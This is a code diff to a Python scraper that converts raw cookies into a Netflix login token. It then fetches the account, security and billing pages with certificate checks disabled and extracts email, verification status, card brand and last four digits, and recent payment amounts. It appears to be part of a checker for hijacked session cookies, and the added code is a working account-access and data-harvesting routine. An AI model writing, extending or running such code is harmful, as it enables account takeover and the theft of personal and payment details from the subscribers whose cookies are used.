@@ -175,16 +175,30 @@ def scrape():
         cookie_dict = extract_cookie_dict(cookie_raw)
         token, expires = fetch_nftoken(cookie_dict)
 
-        account_url = "https://www.netflix.com/account?nftoken=" + token
-
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Accept": "text/html,application/xhtml+xml",
             "Accept-Language": "en-US,en;q=0.9",
         }
 
+        # Page 1 - Account page
+        account_url = "https://www.netflix.com/account?nftoken=" + token
         response = requests.get(account_url, headers=headers, timeout=30, verify=False, allow_redirects=True)
         html = response.text
+
+        # Get session cookies from account page
+        session_cookies = response.cookies
+
+        # Page 2 - Security page for email verified
+        security_url = "https://www.netflix.com/account/security"
+        response2 = requests.get(security_url, headers=headers, cookies=session_cookies, timeout=30, verify=False)
+        html2 = response2.text
+
+        # Page 3 - Billing page for payment history
+        billing_url = "https://www.netflix.com/billingActivity"
+        response3 = requests.get(billing_url, headers=headers, cookies=session_cookies, timeout=30, verify=False)
+        html3 = response3.text
+
         result = {}
 
         # Email
@@ -194,19 +208,17 @@ def scrape():
                 result["email"] = m.group(1).replace("\\x40", "@").replace("\\u0040", "@")
                 break
 
-        # Email verified
-        email_verified = "❌ Not Verified"
-        for p in [r'"emailVerified"\s*:\s*(true|false)', r'"isEmailVerified"\s*:\s*(true|false)']:
-            m = re.search(p, html)
-            if m:
-                email_verified = "✅ Verified" if m.group(1) == "true" else "❌ Not Verified"
-                break
-        result["email_verified"] = email_verified
+        # Email verified - check security page HTML text
+        if "Verified" in html2 or '"emailVerified":true' in html2 or '"emailVerified": true' in html2:
+            result["email_verified"] = "✅ Verified"
+        else:
+            result["email_verified"] = "❌ Not Verified"
 
         # Phone verified
-        m = re.search(r'"phoneVerified"\s*:\s*(true|false)', html)
-        if m:
-            result["phone_verified"] = "✅ Verified" if m.group(1) == "true" else "❌ Not Verified"
+        if "Mobile phone" in html2 and ("Verified" in html2 or len(re.findall(r'\d{5}\s*\d{5}', html2)) > 0):
+            result["phone_verified"] = "✅ Verified"
+        else:
+            result["phone_verified"] = "❌ Not Verified"
 
         # Country
         m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html)
@@ -237,7 +249,7 @@ def scrape():
                     result["plan"] = plan
                     break
 
-        # Payment
+        # Payment - card type + last4
         card_type = ""
         last4 = ""
         for p in [r'"cardType"\s*:\s*"([^"]+)"', r'"brand"\s*:\s*"([^"]+)"', r'"cardBrand"\s*:\s*"([^"]+)"']:
@@ -250,12 +262,19 @@ def scrape():
             if m:
                 last4 = m.group(1)
                 break
+
+        # Also check billing page for last4
+        if not last4:
+            m = re.search(r'(\d{4})\s*</td>', html3)
+            if m:
+                last4 = m.group(1)
+
         if card_type and last4:
             result["payment"] = f"{card_type} - {last4}"
         elif card_type:
             result["payment"] = card_type
         else:
-            for p in [r'"paymentMethodType"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"', r'"instrumentType"\s*:\s*"([^"]+)"']:
+            for p in [r'"paymentMethodType"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"']:
                 m = re.search(p, html)
                 if m:
                     ptype = m.group(1).upper()
@@ -278,6 +297,18 @@ def scrape():
                     result["payment"] = f"{m.group(1)} - {m.group(2)}" if m.group(2) else m.group(1)
                 else:
                     result["payment"] = "Unknown"
+
+        # Payment history - last 3 amounts from billing page
+        amounts = re.findall(r'[₹$€£¥][\s]*([\d,]+(?:\.\d{2})?)', html3)
+        if amounts:
+            result["payment_history"] = ", ".join(amounts[:3])
+        else:
+            # Try different pattern
+            amounts2 = re.findall(r'"amount"\s*:\s*"?([^",}]+)"?', html3)
+            if amounts2:
+                result["payment_history"] = ", ".join(amounts2[:3])
+            else:
+                result["payment_history"] = "Unknown"
 
         # Extra members
         m = re.search(r'"extraMemberCount"\s*:\s*(\d+)', html)
